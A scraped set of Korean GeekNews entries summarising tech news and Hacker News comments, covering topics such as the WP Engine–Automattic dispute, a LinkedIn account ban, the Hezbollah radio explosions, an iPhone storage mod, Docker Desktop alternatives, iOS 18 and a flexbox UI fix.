   WP Engine이 Automattic에 ""중단 및 금지 명령"" 서신을 보냄
   WP Engine, WordPress.org에서 Ban됨
   워드프레스 생존을 위해서는 Matt Mullenweg가 퇴진해야 합니다

   해커뉴스 의견 보니 본격적인 분쟁이 있는 것 같네요 ;-;

        Hacker News 의견

     * Matt와 WP Engine 간의 문제의 출처를 이해하는 것이 필요함
          + 며칠 전 Matt가 X에 WP Engine이 Automattic과 비슷한 수익을 올리지만 오픈 소스에 약속한 만큼 기여하지 않는다고 게시함
          + WP Engine 직원이 관리자가 KPI 목표와 맞지 않아 기여를 허용하지 않는다고 답변함
          + 그 직원은 다음 날 해고됨
          + 이 사건으로 Matt와 WP Engine 간의 문제가 심화됨
     * Matt가 자신의 소프트웨어 호스팅 회사가 기본 설정을 변경한 것에 화를 내는 것이 이상함
          + 소스 코드가 변경되거나 커스텀 패치가 적용된 것은 아님
          + ""WordPress처럼 보이게 잘라내고, 해킹하고, 도살했다""는 주장은 과장됨
     * WordPress의 리비전 시스템은 서버 자원을 많이 소모함
          + 리비전 기록을 비활성화하는 설정이 있음
          + WP Engine이 WordPress 기능을 끄는 것을 ""암""이라고 부르는 것은 이상함
          + 모든 WordPress 호스트는 소프트웨어를 수정함, 특히 Automattic도 마찬가지임
     * ""WordPress는 WordPress가 아니다""는 혼란스러운 현실을 고객에게 여러 번 설명해야 했음
          + WordPress.com과 실제 WordPress는 다름
          + 같은 로고와 브랜드를 사용하지만 다른 회사임
          + WP Engine이 비활성화한 설정은 아쉽지만 Automattic이 자초한 혼란에 비하면 아무것도 아님
     * Matt가 WP Engine을 공격하는 것은 위선적임
          + 많은 주요 WP 생태계 플레이어들이 더 나쁜 윤리적 문제를 가지고 있음
          + 생태계 수준에서의 검토와 변화가 필요함
          + 상업적 WP 운영을 하는 사람이 경쟁사를 공격하는 게시물을 올리는 것은 적절하지 않음
     * 오픈 소스는 임금 착취와 가치 추출이 내재되어 있음
          + WP Engine은 ""안전하고 보안이 철저한 WordPress""를 제공한다고 홍보했음
          + 시간이 지나면서 서비스의 가치를 줄이고 가격을 유지하거나 올림
          + 경영진의 무결성은 매우 다름
     * WordPress의 리비전 시스템은 성능이 좋지 않음
          + 페이지의 리비전이 많을수록 게시 시간이 길어짐
          + 페이지 게시 요청이 시간 초과될 수 있음
          + 페이지당 리비전 수를 제한해야 함
     * 회사의 마케팅 웹사이트를 위해 WordPress와 WP Engine을 선택함
          + WP Engine의 배포 아티팩트가 충분히 좋음
          + 상사는 게시물 버전 관리에 대해 묻지 않음
          + WP Engine의 커스텀 스냅샷 기능이 필요를 충족함
     * 콘텐츠 관리 시스템으로서 WordPress의 콘텐츠는 신성함(Sacred)
          + 리비전 추적 시스템의 부재가 신성한 원칙의 위반으로 보이지 않음
     * WP Engine을 사용하는 것이 개인적으로 싫음
          + Cloudflare가 고객 지원을 가장해 기술 문제를 해결하려 했던 사례와 유사한 경험이 있음
          + WP Engine이 가격을 올림
          + 비기술적 고객을 대상으로 도움을 줄 것이라고 약속하며 착취함
"
"https://news.hada.io/topic?id=16823","Meshtastic 비디오로 인해 LinkedIn 차단","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     Meshtastic 비디오로 인해 LinkedIn 차단

LinkedIn이 사라졌습니다. Edgemap 토론에 오신 것을 환영합니다!

  환영합니다!

     * LinkedIn에서 이상한 일이 발생했음을 알리기 위해 이 토론 섹션을 활성화함
     * 신뢰할 수 있는 연락처에게 유튜브 비디오 링크를 보냈으나, 이후 LinkedIn 계정 접근이 차단됨

  다른 사건들

     * Edgemap 관련 기술에 대해 LinkedIn 개인 채팅에서 논의한 후 Signal 그룹 초대를 받았으나, Signal 설치 후 로그인 오류 발생

  결론

     * 아직 결론을 내리지 못했으며, LinkedIn의 대응을 기다리고 있음
     * 오픈 소스 개발자로서 겪는 도전 과제에 대해 논의

  업데이트

     * LinkedIn 계정이 다시 활성화되었으나, 프로필 사진과 계정 이름 변경 요구를 받음
     * 디지털 주권 여정을 위한 더 나은 전략을 고민 중

  최신 업데이트

     * LinkedIn 계정이 다시 제한됨
     * GitHub 페이지를 통해 연락처 정보를 업데이트할 예정

  LinkedIn 복귀

     * LinkedIn 계정 문제는 잘못된 계정 생성 방식 때문이었음
     * Resilience Theatre 페이지를 새로 생성하고, GitHub 프로필 페이지에 다른 채널 정보도 업데이트함

GN⁺의 정리

     * 이 기사는 오픈 소스 프로젝트 Edgemap의 개발자가 LinkedIn 계정 문제를 겪은 경험을 공유함
     * 오픈 소스 개발자로서의 도전 과제와 디지털 주권에 대한 고민을 다룸
     * 비슷한 기능을 가진 프로젝트로는 GitLab이 추천됨

        Hacker News 의견

     * 더 나은 전문 네트워킹 플랫폼이 필요함
          + 현재 플랫폼은 자화자찬하는 사람들로 가득 차 있음
     * Apple의 분산 이미지 해싱 계획이 성공했다면, 잘못된 혐의로 인해 큰 피해를 입었을 것임
     * 큰 기술 회사가 실수로 계정을 닫으면 큰 문제가 될 수 있음
          + LinkedIn 계정이 닫히면 새로운 계정을 만들 수 있을지 의문
          + Gmail 계정을 잃으면 중요한 데이터에 접근할 수 없게 됨
     * 아침 5시에 러닝머신 위에서 건강 음료를 마시며 하루를 시작함
          + 건강한 생태계가 중요함
          + 조직의 모든 구성원이 가치 있고 행복하게 느끼는 것이 중요함
          + 작은 기여도 전체 시스템을 원활하게 운영하게 함
     * 비디오가 잘못된 플래그로 표시되었음
          + LinkedIn에서 오픈 소스 프로젝트를 계정 이름으로 사용하는 것은 잘못된 사용법임
          + ToS에 따르면 여러 계정을 가질 수 없음
     * LinkedIn이 메시지에서 포르노 스캔을 켰고, 잘못된 긍정 결과가 나왔음
          + 정치적 이유로 차단되었는지 의문
     * LinkedIn의 메시지 정책 위반 감지 메시지에 문법 오류가 있음
     * Microsoft/LinkedIn이 우크라이나 콘텐츠에 불만이 있는지, 아니면 ToS 봇의 잘못된 긍정 결과인지 의문
     * LinkedIn에서 차단되면 Signal에 가입할 수 없다는 내용이 있음
          + Microsoft가 사이트 전반에 걸쳐 시스템을 사용할 수 있음
          + Signal이 어떻게 관련되는지 이해하기 어려움
"
"https://news.hada.io/topic?id=16845","소식통에 따르면 레바논 전역에서 폭발한 Hezbollah 휴대용 라디오","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                소식통에 따르면 레바논 전역에서 폭발한 Hezbollah 휴대용 라디오

        Hacker News 의견

     * 이스라엘의 행동이 테러로 간주되지 않는 이유에 대한 궁금증
          + 전술적으로 유사하지만 기술적으로 더 복잡함
          + 테러와의 차이점이 무엇인지 궁금함
          + 다른 서방 국가들도 유사한 전술을 사용했음
     * 국제 기업들이 국가 전용으로 변할 가능성
          + Apple, Samsung 같은 대기업만 신뢰받을 가능성
          + 현지 공급망과 생산자가 중요해질 수 있음
          + 글로벌화된 세계에 대한 또 다른 문제
     * 많은 기기에 폭발물을 설치하는 것이 우물에 독을 타는 것과 유사함
          + 반유대주의 문제와는 별개의 논의
     * 어제 사건과는 다른 통신 장치에 대한 사건
          + 첫 번째 사건에 대한 Nasrallah의 연설 2분 전에 발생
     * ""칼로 살면 칼로 죽는다""는 반응
          + 민주주의 국가에서 더 나은 행동을 기대함
          + 레바논/헤즈볼라의 테러 전술은 놀랍지 않지만 이스라엘의 반응은 뉴스가 됨
          + 드론 폭격은 더 큰 피해를 줄 수 있지만 덜 주목받음
          + 개인적이고 보복적인 느낌 때문에 더 충격적일 수 있음
     * 폭발하지 않은 호출기를 통해 폭발물 설치 방법을 알 수 있음
          + ""전문가""들이 폭발물 배터리를 해체하는 비디오를 상상
     * Mossad가 폭발물을 설치했다면, 레바논에 전달된 많은 전자 기기에 도청 장치도 설치했을 가능성
          + Supermicro 서버 마더보드에 스파이 칩을 심은 것과 유사함
     * 원래 호출기 공격이 제2차 세계 대전 영웅 Folke Bernadotte 암살 기념일에 발생
          + 의미 있는 선택인지 우연인지 궁금함
     * 이스라엘이 이 전술을 두 번 사용한 것에 대한 논의
     * SDR을 사용하여 RF 스펙트럼을 캡처해야 할 필요성
          + 호출기가 특정 그룹 코드로 설정되어 폭발할 수 있음
          + 라디오도 비슷한 방식으로 설정될 수 있음
     * 헤즈볼라가 사실상 남부 레바논의 정부 역할을 하고 있음
          + IDF의 기습 공격 이전에 레바논을 두 개로 분할하는 논의가 있었음
          + 이 논의가 어떻게 발전할지 궁금함
"
"https://news.hada.io/topic?id=16913","아이폰 16 프로 저장 용량 확장 128GB에서 1TB로 [영상]","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  아이폰 16 프로 저장 용량 확장 128GB에서 1TB로 [영상]

        Hacker News 의견

     * ""폰 하단의 나사 두 개를 제거 - 쉬움, 나도 할 수 있을 것 같음""
     * ""접착제를 부드럽게 하고 뒷면을 빼내기 - 접착제만 찾으면 할 수 있을 것 같음""
     * ""수십 개의 케이블과 부품 분리 - 다시 조립하는 게 어려울 것 같음""
     * ""메인보드에서 보호 폼 제거 - 이걸 교체하는 게 가능한지 의문임""
     * ""기존 128GB NAND를 CNC로 갈아내기 - 이제 그만 보는 게 좋을 것 같음""
     * ""비즈니스 모델을 떠나서, Apple의 하드웨어는 정말 예쁨""
          + ""포장, 케이블, 커넥터, 메인보드 모두 아름다움""
     * ""이 비디오가 내 뇌의 특정 부분을 자극함""
          + ""자동차 작업 (토크 렌치 클릭 소리)""
          + ""전자기기 분해""
          + ""기계식 시계 작업""
          + ""불필요한 CNC 사용""
     * ""조용한 비디오에서 NAND 칩을 교체하는 걸 보면서 혼란스러움""
     * ""더 나은 NAND 칩을 사용하면 성능/내구성 특성이 개선될 수 있는지 궁금함""
          + ""Apple이 승인한 부품이어야 하는지 의문임""
     * ""모더의 기술력이 놀라움""
          + ""이스라엘 보안 서비스가 NAND 저장소를 교체하는 걸 상상해 보라""
     * ""국가 수준의 공격자가 특정 개인을 타겟으로 할 수 있다는 점을 지적함""
     * ""왜 1TB만 선택했는지 하드웨어 제약이 있는지 궁금함""
          + ""2TB/4TB/8TB NAND 플래시가 온라인에서 판매되고 있음""
          + ""전문가에게 8TB 유닛 설치를 의뢰할 수 있는지 궁금함""
          + ""Macbook에서 지원되는 모델을 보니 iPhone에서도 가능할지 의문임""
     * ""고객을 여러 가지로 제약하는 회사를 왜 계속 지원하는지 이해할 수 없음""
     * ""2배속으로 봤는데 손의 정밀성과 안정성이 놀라움""
          + ""특히 작은 폼 개스킷을 추출할 때""
     * ""경제적으로 실현 가능한지 아니면 단순한 과시인지 궁금함""
          + ""숙련된 노동력과 장비를 고려하면 $500 업그레이드보다 저렴하지 않을 것 같음""
     * ""Apple이 제공하는 모델보다 더 큰 저장 용량을 추가하면 어떻게 되는지 궁금함""
          + ""2TB/4TB/8TB로도 정상 작동할지, 아니면 OS가 이를 감지하고 제한할지 의문임""
     * ""다른 모델에서도 본 적 있음""
          + ""1TiB는 공장 옵션이므로 아시아 시장 해킹처럼 4배 또는 8배 용량을 제공하는 것은 아님""
"
"https://news.hada.io/topic?id=16867","도커 데스크톱 대안","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               도커 데스크톱 대안

Podman Desktop 소개

   Podman Desktop는 Podman 팀이 직접 만든 크로스 플랫폼 데스크탑 UI로, 무료 오픈 소스 컨테이너 관리자인 Podman을 위한 친숙한 데스크탑 그래픽 인터페이스임.

  Podman Desktop의 주요 기능

     * 크로스 플랫폼 통합 애플리케이션: Windows, Mac, Linux에서 동일한 그래픽 인터페이스 제공
     * Podman 명령어 학습 도구: Podman의 강력한 명령어 인터페이스 학습 및 기능 향상에 유용함
     * 필수 기능 제공: 대시보드는 필수 기능만 제공하여 사용자에게 친숙한 환경 제공

  관리 가능한 항목

    크로스 플랫폼

     * 애플리케이션이 어디서나 동일하게 보임
     * 로그와 설정 저장 위치를 완전히 알림
     * 디버깅 및 내부 동작 이해 가능

    여러 엔진 지원

     * Linux에서 네이티브로 빠르게 동작
     * 모든 OS에서 가상화 지원
     * MacOS에서 LIMA 지원
     * Windows에서 WSL 지원
     * Podman 및 Docker 엔진 지원
     * 추가 엔진 계획 중

    컨테이너 관리

     * 컨테이너 환경의 출처와 상태 정보 제공
     * 로그, 환경 변수, 마운트, 열린 포트 및 모니터링 통계에 빠르게 접근
     * 일반적인 유지보수 작업 수행: 중지, 재시작, 제거
     * 브라우저를 통해 노출된 서비스에 직접 접근
     * 터미널 콘솔을 사용하여 컨테이너 내부 제어

    이미지 관리

     * 로컬 이미지 저장소의 출처와 상태 정보 제공
     * 이미지에서 새로운 컨테이너 즉시 생성, 이름, 포트 매핑 및 마운트 설정 가능
     * 이미지 빌드업 빠르게 접근, 영향 확인 및 디버깅
     * 심층 구성 뷰어 제공
     * 일반적인 유지보수 작업 수행: 최신 업데이트 가져오기, 변경 사항 푸시

    보안

     * 심층 보안 검사 인식
     * 알려진 취약점 정보 제공
     * 안전한 시스템 생성 및 유지보수 도움

    네트워크 관리

     * 언제든지 네트워크 생성 및 재사용 가능
     * 각 네트워크의 상세 설정 정보 제공

    포드 관리

     * 지원되는 엔진에서 포드의 모든 기능 사용
     * 로그, 프로세스 및 세부 정보 접근
     * kube 생성 및 일반적인 작업 수행

    머신 관리

     * 사용 가능한 모든 Podman 가상 머신 관리, 새로운 머신 생성 또는 불필요한 머신 제거

    시크릿 관리

     * 사용 가능한 모든 시크릿 인식, 새로운 시크릿 정의 또는 오래된 시크릿 삭제

    볼륨 관리

     * 컨테이너 간 공유 볼륨 관리, 반복 제한 및 이식성 제공

    효율적인 UX

     * 불필요한 팝업 없이 필요한 경우에만 심층 정보 제공

GN⁺의 정리

   Podman Desktop은 다양한 운영체제에서 일관된 사용자 경험을 제공하는 강력한 도구임. 특히, Podman 명령어를 학습하고 컨테이너 환경을 효율적으로 관리하는 데 유용함. 보안, 네트워크, 포드, 머신, 시크릿, 볼륨 관리 등 다양한 기능을 제공하여 DevOps 및 개발자들에게 큰 도움이 될 것임. Docker와 같은 다른 컨테이너 관리 도구와 비교했을 때, Podman Desktop은 오픈 소스의 장점을 최대한 활용하며, 사용자가 컨테이너 환경을 더 잘 이해하고 제어할 수 있도록 돕는다는 점에서 차별화됨.

   몇 년 전부터 posman이란 게 있단 건 알고 있었는데 버그가 꽤 많고 걸리적거리는 부분이 많다고 들었습니다. 최근에는 많이 나아졌나요?

        Hacker News 의견

     * Kubernetes를 추가하고 싶어하는 DevOps의 요청을 받았음
          + 이 프로젝트는 상업적이지 않고, 비즈니스 목표를 따르지 않음
          + 최소한의 리소스 사용, 쉬운 경험, 좋은 UI/UX 제공을 목표로 함
          + 개발자 콘솔을 활성화하면 백그라운드에서 무슨 일이 일어나는지 설명해줌
          + 사용자가 스크립트와 스펙으로 자동화할 수 있도록 도움
          + 사용자를 너무 똑똑하거나 너무 멍청하게 보지 않음
          + 점진적인 학습 경험이 가장 좋다고 생각함
          + 벨기에에서 비가 많이 올 때, 퇴근 후에 한 사람이 만든 프로젝트임
     * Kubernetes 지원이 중요한 이유
          + Docker Desktop을 사용하는 주요 이유 중 하나는 로컬 Kubernetes 클러스터를 호스팅하기 위해서임
          + Rancher Desktop도 지원하며, k3s를 사용함
          + 최근 OrbStack을 사용해봤는데, 거의 즉시 시작됨
          + Kubernetes는 최대 2초 안에 시작됨
          + UI는 최소한이지만 컨테이너, 포드, 서비스, 로그 등을 검사하는 데 충분함
          + 메모리 사용량과 배터리 소모가 매우 적음
          + OrbStack 사용 후 Docker나 Rancher Desktop으로 돌아갈 수 없었음
          + Kubernetes 서비스 도메인을 호스트에서 직접 사용할 수 있음
          + 배터리 절약, 동적 메모리 사용, 빠른 시작 시간, OrbStack의 품질이 Docker Desktop 대안의 기준이 됨
     * Rancher Desktop 사용 경험
          + macOS와 Windows에서 Docker Desktop 대안으로 사용 중
          + 몇 가지 문제점이 있지만 IDE와도 잘 작동함
          + 기존 스크립트와 docker-compose CLI도 Rancher Desktop에서 작동함
     * macOS 사용자에게 OrbStack 추천
          + OrbStack과 관련이 없음을 밝힘
     * Podman Desktop도 좋은 대안임
          + Red Hat의 지원을 받음
     * colima 사용 중이며, UDP 포트 포워딩을 지원하는 대안이 없어서 아쉬움
          + lima가 새로운 포트 포워더를 도입했으며, 곧 사용할 수 있기를 기대함
     * OrbStack 사용 경험
          + Linux VM과 Kubernetes도 지원함
     * Podman의 호스트 마운트 기능
          + Docker는 이미지 빌드 중 호스트 마운트를 지원하지 않음
          + monorepo를 사용하는 Podman은 소스에서 컨테이너 이미지를 생성할 수 있음
          + Docker는 매번 monorepo를 빌드 컨텍스트로 복사해야 했음
          + M1 지원을 위해 Docker를 사용해야 했음
     * Podman Desktop과의 차이점 질문
          + Container Desktop이 Podman을 번들로 제공하지 않음
          + Docker Desktop과의 유사성 때문에 번들로 제공할 것이라고 생각했음
          + Kubernetes 사용자는 아니지만, Compose와 docker run을 주로 사용함
"
"https://news.hada.io/topic?id=16910","iOS에서 앱 삭제를 막는 법","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            iOS에서 앱 삭제를 막는 법

   [아이폰에서 앱 삭제 방지 기능을 구현한 이야기]
     * 슈퍼알람은 미션을 수행해야만 끌 수 있는 알람 앱
     * 유저들의 가장 큰 불만은 잠결에 미션을 수행하지 않고 앱을 지워서 알람을 끈다는 것
     * 안드로이드에서는 알람이 울릴때 나갈 수 없도록 강제할 수 있지만 iOS는 그럴 수 없음.
     * 스크린 타임 API 를 이용하면 코드 한줄로 앱 삭제를 막을 수 있음
     * 이 API를 사용하려면 애플과 유저의 승인이 필요
"
"https://news.hada.io/topic?id=16829","애플, iOS 18 출시","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             애플, iOS 18 출시

     * 강력한 사용자화: 앱아이콘과 위젯을 마음대로 배치, 색조 지정 가능
     * 사진: 보관함 통합. 온디바이스 지능으로 자동 정리(‘최근 며칠’, ‘사람들 및 반려동물’, ‘여행’ 등)
     * 메시지: 볼드체, 이탤릭체, 밑줄체, 취소선 등 서식 옵션. 이모티콘/스티커 탭백. 예약 전송. RCS 지원
     * 전화: 실시간 통화내용을 녹음 및 전사(연내 제공 예정)
     * 메일: 카테고리 분류 (연내 도입 예정)
     * 사파리 : '하이라이트'로 웹페이지가 로딩된 후에 위치 주소, 요약, 영화, TV 프로그램, 노래에 관한 추가 정보 등 주요 정보를 지능적으로 표시
     * 새로운 '암호' 앱 : 한곳에서 암호에 접근하고 암호/인증코드 등 모든 자격증명을 확인 가능
     * Apple Intelligence
          + 글쓰기 도구 : 텍스트를 재작성, 교정, 요약
          + 사진 : '추억' 기능으로 설명을 입력하면 보고 싶은 동영상을 생성. 자연어로 검색. 동영상에 특정 순간 검색. '정리' 도구로 필요없는 요소 삭제
          + Siri가 더욱 자연스럽고 유연하며 시스템 경험에 더 깊이 통합
          +

     Apple Intelligence는 Siri 및 기기 언어를 미국 영어로 설정한 iPhone 16, iPhone 16 Plus, iPhone 16 Pro, iPhone 16 Pro Max, iPhone 15 Pro, iPhone 15 Pro Max 그리고 M1 칩 이후 버전을 탑재한 iPad 및 Mac에서 사용 가능함. Apple Intelligence는 올해 호주, 캐나다, 뉴질랜드, 남아프리카 공화국, 영국의 현지 표준 영어로 지원을 확대할 예정이며, 내년에는 중국어, 인도 현지 표준 영어, 싱가포르 현지 표준 영어, 프랑스어, 독일어, 이탈리아어, 일본어, 한국어, 포르투갈어, 스페인어, 베트남어 등 더 많은 언어도 추가로 지원할 예정임.
     * 게임모드 : 오래 게임을 즐기는 동안 보다 일관된 프레임률을 지원하고 AirPods, 게임 컨트롤러, 기타 무선 액세서리 사용 시 놀라운 반응성을 선사
     * 메모 : 타이핑하는 동안 들어간 수학 공식이나 방정식을 그 자리에서 바로 풀 수 있음
     * 홈 앱: 방문자 접근 기능을 도입
     * 긴급 구조 요청 실시간 비디오를 사용하면 동영상 스트리밍과 녹화된 미디어를 통해 상황을 공유할 수 있음
     * AirPods: 음성 분리. 'Siri 상호작용'
     * 손쉬운 사용:
          + ‘눈 추적’ 기능은 눈만으로 iPhone을 탐색할 수 있도록 해주고,
          + ‘음악 햅틱’은 청각 장애 또는 난청이 있는 사용자가 iPhone에서 Taptic Engine으로 음악을 체험
          + ‘음성 단축어’ 기능을 사용하면 직접 설정한 소리로 작업을 수행
          + ‘차량 모션 큐’는 이동 중인 차량에서 iPhone을 사용할 때 탑승자의 멀미를 줄이는 데 도움을 줌
          + ‘소리 인식’, ‘색상 필터’, ‘볼드체 텍스트’ 등의 손쉬운 사용 기능들이 CarPlay에도 지원

   처음에 macOS Seqouia 출시때는 한국어 지원 예정이 없었는데, iOS 18 출시하면서 맥/아이폰/아이패드 등 모든 곳에 한국어 지원이 내년에 된다고 적어놨네요. 출시가 조금 빨라 지나 봅니다.
"
"https://news.hada.io/topic?id=16853","유리 안테나로 창문을 5G 기지국으로 변환","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        유리 안테나로 창문을 5G 기지국으로 변환

     * 유리 안테나가 창문을 5G 기지국으로 전환
     * 컴팩트하고 눈에 띄지 않는 안테나가 셀 커버리지를 투명하게 증가시킬 수 있음
     * 전자 장치가 투명한 전도성 층에 눈에 띄지 않게 부착되어 창문이 5G 셀룰러 안테나로 기능할 수 있음
     * 주요 내용
          + 유리 안테나는 기존의 안테나보다 더 작고 눈에 띄지 않음
          + 셀 커버리지를 증가시키면서도 건물의 외관을 해치지 않음
          + 투명한 전도성 층을 사용하여 신호를 전달함
     * 기술적 이점
          + 기존의 큰 안테나 구조물 대신 유리 안테나를 사용하여 공간 절약 가능
          + 건물의 미관을 유지하면서도 통신 품질을 향상시킬 수 있음
          + 설치가 간편하고 유지보수가 용이함
     * 적용 가능성
          + 도시 지역에서의 셀 커버리지 문제를 해결하는 데 유용함
          + 건물의 외관을 중요시하는 고급 주거지나 상업지구에 적합함
          + 기존의 통신 인프라를 보완하는 역할을 할 수 있음
     * 연구 및 개발
          + 유리 안테나의 성능을 최적화하기 위한 연구가 진행 중임
          + 다양한 환경에서의 테스트를 통해 실용성을 검증하고 있음
          + 상용화를 위한 추가 개발이 필요함
     * GN⁺의 정리
          + 유리 안테나는 셀 커버리지를 투명하게 증가시키는 혁신적인 기술임
          + 건물의 외관을 해치지 않으면서도 통신 품질을 향상시킬 수 있는 장점이 있음
          + 도시 지역의 통신 문제를 해결하는 데 큰 도움이 될 수 있음
          + 추가 연구와 개발을 통해 상용화 가능성이 높음
          + 비슷한 기능을 가진 다른 프로젝트로는 Google의 Project Loon이 있음

        Hacker News 의견

     * 더 많은 무해한 셀 안테나를 지지하지만, 이번 경우에는 확신이 부족함
          + 사진을 보면 무해하지도 않고 투명하지도 않음
          + 노출된 동축 케이블 없이 연결을 덜 명확하게 만들 수 있을지 모름
          + 추가 창문을 설치하지 않고도 전도성 영역을 더 투명하게 만들 수 있을지 모름
          + 개념 증명으로만 유용함
          + 상업용 제품으로 무엇을 할 수 있을지 지켜봐야 함
          + 보통 하나의 타워에 수십 개의 안테나가 있으므로 모두 이렇게 보일 수는 없음
          + 방사된 전자파 때문에 3미터 이내에 접근하지 못하게 해야 함
     * 자원봉사자가 연결성을 제공하여 모바일 네트워크 운영자가 필요 없는 메쉬 5G 네트워크를 만들 수 있는지 궁금함
     * 투명한 전도성 재료를 안테나로 사용하는 아이디어가 이전에는 없었다고 생각하지 않음
          + 2000-2020년 사이의 약간 오래된 자동차에는 유리에 내장된 안테나가 있었음
          + 아이디어는 견고함
          + 유리에 내장된 안테나는 보호되므로 매우 얇고 거의 보이지 않음
          + 상어 지느러미나 지붕의 막대보다 더 미적으로 만족스러움
          + 이것은 공학적 선택보다는 미적 선택으로 간주함
          + 지붕에 작은 안테나가 튀어나오는 것이 공학적 문제를 충분히 해결함
     * 출구 표지판으로도 사용할 수 있는 버전을 보고 싶음
          + 출구 표지판 링크
     * 'windows'가 소문자로 되어 있어 운영 체제가 아닌 창문에 대한 것임을 깨닫는 데 시간이 걸림
     * 유리를 두드리면 신호가 방해되거나 바람이나 강한 비가 신호를 방해할 수 있는지 궁금함
     * 맥락에서 벗어난 것일 수 있지만, 이것이 셀 타워 REITs에 어떤 영향을 미칠지 궁금함
     * 유리 안에 배열된 안테나가 빔포밍을 통해 건물 내에서 신호 강도를 지능적으로 증가시킬 수 있을지 기대됨
     * 샌프란시스코의 비즈니스에 완벽함
     * 왜 매번 창문에 붙이는 매의 실루엣을 안테나로 만들지 않는지 궁금함
"
"https://news.hada.io/topic?id=16864","CuPy - GPU를 위한 NumPy 및 SciPy 대체제","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    CuPy - GPU를 위한 NumPy 및 SciPy 대체제

     * ""NumPy & SciPy for GPU""
     * GPU 가속 컴퓨팅을 위한 NumPy/SciPy 호환 배열 라이브러리
     * 기존의 NumPy/SciPy 코드를 NVIDIA CUDA 또는 AMD ROCm 플랫폼에서 실행할 수 있도록 대체
     * 저수준의 CUDA 기능에도 접근 가능
          + ndarray를 기존의 CUDA C/C++ 프로그램에 전달하거나, 성능을 위해 Streams를 사용하거나, CUDA Runtime API를 직접 호출할 수 있음
"
"https://news.hada.io/topic?id=16843","Ask HN: 아들이 시각 장애가 있을지도 모릅니다 – 최선의 지원 방법","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Ask HN: 아들이 시각 장애가 있을지도 모릅니다 – 최선의 지원 방법

     * 아들이 시각 장애가 있을지도 모름
     * 몇 개월밖에 안 되었지만 걱정스러운 점이 있음
     * 시각 장애가 있는 아기, 유아, 그 이후의 지원 방법을 배우기 위한 자료, 책, 웹사이트 등을 찾고 있음
     * 도움을 주시면 감사하겠음

GN⁺의 정리

     * 시각 장애가 있는 아이를 키우는 부모에게 유용한 자료를 찾는 내용임
     * 시각 장애에 대한 초기 지원과 교육 방법에 대한 정보가 필요함
     * 비슷한 상황에 있는 부모들에게 공감과 도움이 될 수 있는 자료임
     * 관련된 자료로는 시각 장애 아동을 위한 교육 서적, 지원 단체 웹사이트, 전문가의 조언 등이 있음

        Hacker News 의견

     * 첫 번째 댓글
          + 맹인으로서의 경험을 바탕으로 조언 제공
          + 자녀의 상태나 전망에 대해 숨기지 말 것
          + 기술에 너무 의존하지 말고, 지팡이와 개가 가장 유용한 도구임
          + 독립성을 키우는 것이 중요함
          + 맹인 지팡이의 가치를 강조하며, 이를 받아들이는 데 시간이 걸렸음을 언급
          + 맹인으로서의 삶이 어렵지만, 좋은 가정환경 덕분에 행복한 삶을 살고 있음
     * 두 번째 댓글
          + 0에서 3세 프로그램에 연락할 것을 권장
          + 신경 손상으로 인해 맹인이었으나, 의사들의 노력으로 시력을 일부 회복함
          + 조기 치료의 중요성을 강조하며, 전문가와 상담할 것을 권장
     * 세 번째 댓글
          + 맹인 아이가 또래들과 잘 어울리는 모습을 관찰한 경험 공유
          + 지지적인 또래 환경의 중요성을 강조
     * 네 번째 댓글
          + 어린 나이에 맹인이 된 사람들이 혀로 소리를 내어 반향 위치를 파악하는 기술을 개발할 수 있음
          + 이 기술을 억제하지 말고, 오히려 가르치는 것이 도움이 될 수 있음
          + 관련 연구 링크 제공
     * 다섯 번째 댓글
          + Braille Institute of America와 American Foundation for The Blind 등의 자원 소개
          + 저시력 아동을 위한 기술 도구에 대한 정보 제공
          + 추가 자원이 필요하면 연락하라는 제안
     * 여섯 번째 댓글
          + 장애를 어떻게 접근해야 하는지에 대한 의견
          + 맹인도 정상적인 삶을 살 수 있다는 말이 때로는 현실적인 문제를 무시하는 것으로 느껴질 수 있음
          + 맹인 커뮤니티와의 연결을 권장
     * 일곱 번째 댓글
          + 미국에 거주하며 출생부터 3세까지의 프로그램에 참여 중임
          + 아들을 위해 필요한 의료적 및 기타 지원을 찾기 위해 노력 중임
     * 여덟 번째 댓글
          + 맹인 프로그래머와의 인터뷰 경험 공유
          + 그의 놀라운 능력에 감탄했음을 언급
     * 아홉 번째 댓글
          + Chennai에 위치한 Sankara Nethralaya 병원 소개
          + 각막 이식 수술을 수행하며, 소아과 의사와 상담할 것을 권장
     * 열 번째 댓글
          + 맹인이나 시각 장애인을 위한 지역 단체나 온라인 커뮤니티의 중요성 강조
          + 이러한 단체들이 유용한 자원을 추천할 수 있음
"
"https://news.hada.io/topic?id=16879","Sandinganding UI

     * 개발을 할 때, 무언가를 만들고, 여러 번 클릭하며, 수정하고, 다시 클릭하는 과정을 반복함
     * 페이지 전환의 경우, 뒤로 가기 버튼을 여러 번 사용함
     * 이는 일종의 QA 전술로, 클릭하며 문제를 찾고 수정하는 과정임
     * 목공 작업과 비슷하게, 큰 문제를 먼저 해결한 후, 세부적인 부분을 다듬는 과정임

  UI 테스트

     * 소프트웨어에는 너무 많은 변수가 있어 모든 것을 테스트하고 다듬기 어려움
     * UI를 여러 번 사용하며 문제를 찾고 수정하는 과정을 반복함

  라디오 옵션 리스트 작업

     * 과 를 같은 행에 배치하고, 중앙 정렬하며, 간격을 둠
     * 예전에는 CSS의 float을 사용했지만, 이제는 flexbox를 사용해 쉽게 작업함

  Foo




  .container {
    display: flex;
    flex-direction: row;
    align-items: center;
    gap: .5rem;
  }


  문제 발견 및 해결

     * UI에서 라디오와 라벨 사이에 클릭이 되지 않는 죽은 영역을 발견함
     * flexbox의 gap 속성이 문제의 원인임을 확인함
     * gap을 제거하고 라벨에 패딩을 추가하여 문제를 해결함
     * 패딩을 라벨에 추가함으로써 죽은 영역 없이 클릭 가능하게 만듦

  결론

     * 작은 문제들이 모여 큰 불편함을 초래할 수 있음
     * 문제를 발견하고 수정하는 과정을 반복하여 최종적으로 매끄러운 결과를 얻음

GN⁺의 정리

     * 이 글은 UI 개발 과정에서 발생할 수 있는 작은 문제들을 발견하고 해결하는 과정을 설명함
     * flexbox를 사용하여 레이아웃을 쉽게 구성할 수 있지만, 예상치 못한 문제가 발생할 수 있음
